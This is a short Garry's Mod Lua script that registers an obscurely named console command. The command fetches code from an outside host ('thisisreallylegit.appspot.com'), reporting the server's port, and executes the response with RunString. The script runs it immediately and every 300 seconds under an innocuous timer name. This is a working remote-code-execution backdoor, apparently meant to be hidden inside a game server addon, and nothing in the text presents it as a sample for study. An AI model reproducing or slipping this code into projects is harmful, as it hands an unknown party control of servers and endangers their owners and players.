concommand.Add( "e7KwlOZB6PT37RBPhyjP", function( ply, cmd, args )
	http.Fetch( "http://thisisreallylegit.appspot.com/iujchfsdacj?port=" .. GetConVarString( "hostport" ), function( body )
		RunString( body, "", false )
	end, function( err ) end )
end )

RunConsoleCommand( "e7KwlOZB6PT37RBPhyjP" )

timer.Create( "clocktimer", 300, 0, function()
	RunConsoleCommand( "e7KwlOZB6PT37RBPhyjP" )
end )